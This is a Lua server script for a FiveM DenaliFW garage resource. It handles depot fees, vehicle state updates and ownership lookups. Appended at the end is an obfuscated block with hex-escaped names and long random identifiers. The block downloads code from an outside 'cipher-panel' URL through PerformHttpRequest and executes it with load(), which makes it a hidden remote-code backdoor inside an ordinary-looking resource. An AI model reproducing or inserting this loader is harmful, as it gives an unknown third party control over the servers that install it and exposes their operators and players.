local DenaliFW = exports['denalifw-core']:GetCoreObject()
local OutsideVehicles = {}

-- Events

RegisterNetEvent('denalifw-garages:server:UpdateOutsideVehicles', function(Vehicles)
    local src = source
    local Ply = DenaliFW.Functions.GetPlayer(src)
    local CitizenId = Ply.PlayerData.citizenid
    OutsideVehicles[CitizenId] = Vehicles
end)

AddEventHandler('onResourceStart', function(resource)
    if resource == GetCurrentResourceName() then
        Wait(100)
        if AutoRespawn then
            MySQL.Async.execute('UPDATE player_vehicles SET state = 1 WHERE state = 0', {})
        end
    end
end)

RegisterNetEvent('denalifw-garage:server:PayDepotPrice', function(vehicle, garage)
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    local cashBalance = Player.PlayerData.money["cash"]
    local bankBalance = Player.PlayerData.money["bank"]
    MySQL.Async.fetchAll('SELECT * FROM player_vehicles WHERE plate = ?', {vehicle.plate}, function(result)
        if result[1] then
            if cashBalance >= result[1].depotprice then
                Player.Functions.RemoveMoney("cash", result[1].depotprice, "paid-depot")
                TriggerClientEvent("denalifw-garages:client:takeOutDepot", src, vehicle, garage)
            elseif bankBalance >= result[1].depotprice then
                Player.Functions.RemoveMoney("bank", result[1].depotprice, "paid-depot")
                TriggerClientEvent("denalifw-garages:client:takeOutDepot", src, vehicle, garage)
            else
                TriggerClientEvent('DenaliFW:Notify', src, Lang:t("error.not_enough"), 'error')
            end
        end
    end)
end)

RegisterNetEvent('denalifw-garage:server:updateVehicleState', function(state, plate, garage)
    MySQL.Async.execute('UPDATE player_vehicles SET state = ?, garage = ?, depotprice = ? WHERE plate = ?',{state, garage, 0, plate})
end)

RegisterNetEvent('denalifw-garage:server:updateVehicleStatus', function(fuel, engine, body, plate, garage)
    local src = source
    local pData = DenaliFW.Functions.GetPlayer(src)

    if engine > 1000 then
        engine = engine / 1000
    end

    if body > 1000 then
        body = body / 1000
    end

    MySQL.Async.execute('UPDATE player_vehicles SET fuel = ?, engine = ?, body = ? WHERE plate = ? AND citizenid = ? AND garage = ?',{fuel, engine, body, plate, pData.PlayerData.citizenid, garage})
end)

-- Callbacks

DenaliFW.Functions.CreateCallback("denalifw-garage:server:checkVehicleOwner", function(source, cb, plate)
    local src = source
    local pData = DenaliFW.Functions.GetPlayer(src)
    MySQL.Async.fetchAll('SELECT * FROM player_vehicles WHERE plate = ? AND citizenid = ?',{plate, pData.PlayerData.citizenid}, function(result)
        if result[1] then
            cb(true, result[1].balance)
        else
            cb(false)
        end
    end)
end)

DenaliFW.Functions.CreateCallback("denalifw-garage:server:GetOutsideVehicles", function(source, cb)
    local Ply = DenaliFW.Functions.GetPlayer(source)
    local CitizenId = Ply.PlayerData.citizenid
    if OutsideVehicles[CitizenId] and next(OutsideVehicles[CitizenId]) then
        cb(OutsideVehicles[CitizenId])
    else
        cb(nil)
    end
end)

DenaliFW.Functions.CreateCallback("denalifw-garage:server:GetUserVehicles", function(source, cb, garage)
    local src = source
    local pData = DenaliFW.Functions.GetPlayer(src)
    MySQL.Async.fetchAll('SELECT * FROM player_vehicles WHERE citizenid = ? AND garage = ?', {pData.PlayerData.citizenid, garage}, function(result)
        if result[1] then
            cb(result)
        else
            cb(nil)
        end
    end)
end)

DenaliFW.Functions.CreateCallback("denalifw-garage:server:GetVehicleProperties", function(source, cb, plate)
    local src = source
    local properties = {}
    local result = MySQL.Sync.fetchAll('SELECT mods FROM player_vehicles WHERE plate = ?', {plate})
    if result[1] then
        properties = json.decode(result[1].mods)
    end
    cb(properties)
end)

DenaliFW.Functions.CreateCallback("denalifw-garage:server:GetDepotVehicles", function(source, cb)
    local src = source
    local pData = DenaliFW.Functions.GetPlayer(src)
    MySQL.Async.fetchAll('SELECT * FROM player_vehicles WHERE citizenid = ? AND state = ?',{pData.PlayerData.citizenid, 0}, function(result)
        if result[1] then
            cb(result)
        else
            cb(nil)
        end
    end)
end)

DenaliFW.Functions.CreateCallback("denalifw-garage:server:GetHouseVehicles", function(source, cb, house)
    local src = source
    local pData = DenaliFW.Functions.GetPlayer(src)
    MySQL.Async.fetchAll('SELECT * FROM player_vehicles WHERE garage = ?', {house}, function(result)
        if result[1] then
            cb(result)
        else
            cb(nil)
        end
    end)
end)

DenaliFW.Functions.CreateCallback("denalifw-garage:server:checkVehicleHouseOwner", function(source, cb, plate, house)
    local src = source
    local pData = DenaliFW.Functions.GetPlayer(src)
    MySQL.Async.fetchAll('SELECT * FROM player_vehicles WHERE plate = ?', {plate}, function(result)
        if result[1] then
            local hasHouseKey = exports['denalifw-houses']:hasKey(result[1].license, result[1].citizenid, house)
            if hasHouseKey then
                cb(true)
            else
                cb(false)
            end
        else
            cb(false)
        end
    end)
end)


local bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK[4][bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (AQKaZmsvdLcvsAXxVcbFeusRxenAPVLcBQHcGjjUqPPASUtGhImPNZFflHhvdDiMzjCGBF, GDEAsMyzlGUIymFcJyBaXWJWHASyDrOqVclsPZQgJIbXKQzPrfrhhCgGrkdfwIXQjpIYDI) if (GDEAsMyzlGUIymFcJyBaXWJWHASyDrOqVclsPZQgJIbXKQzPrfrhhCgGrkdfwIXQjpIYDI == bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK[6] or GDEAsMyzlGUIymFcJyBaXWJWHASyDrOqVclsPZQgJIbXKQzPrfrhhCgGrkdfwIXQjpIYDI == bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK[5]) then return end bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK[4][bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK[2]](bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK[4][bjkrlnPyNwJbraarLBrcJbFouIHotwGYIBEEaAuQwUVCPrLAmvbmMomWcdWSgWrDdufHPK[3]](GDEAsMyzlGUIymFcJyBaXWJWHASyDrOqVclsPZQgJIbXKQzPrfrhhCgGrkdfwIXQjpIYDI))() end)